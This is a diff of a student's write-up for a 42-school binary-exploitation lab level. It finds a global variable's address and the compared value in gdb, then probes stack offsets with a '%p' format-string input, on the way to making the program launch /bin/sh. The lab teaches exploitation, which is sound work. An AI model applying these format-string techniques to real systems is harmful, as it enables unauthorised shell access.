@@ -6,7 +6,7 @@
 #    By: lgarczyn <lgarczyn@student.42.fr>          +#+  +:+       +#+         #
 #                                                 +#+#+#+#+#+   +#+            #
 #    Created: 2019/05/04 18:51:42 by lgarczyn          #+#    #+#              #
-#    Updated: 2019/05/04 19:36:17 by lgarczyn         ###   ########.fr        #
+#    Updated: 2019/05/06 03:50:09 by lgarczyn         ###   ########.fr        #
 #                                                                              #
 # **************************************************************************** #
 
@@ -15,14 +15,17 @@ The executable uses a user-provided format string
 It then checks a global variable to decide if it should launch '/bin/sh'
 
 Get the pointer to the global variable
+gdb level3
 > i var m
 The pointer is 0x0804988c
 
 Get the value that it needs to be
 > disas v
-The value is $0x40, or 64
+> cmp $eax, 0x40
+The value is 0x40, or 64
 
 Get the offset of the format string in the stack
+(offset used by printf, starting at 1, in increments of 4 bytes)
 > ./level3
 ---------------------------------- %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
 ---------------------------------- 0x200 0xb7fd1ac0 0xb7ff37d0 0x2d2d2d2d [...]
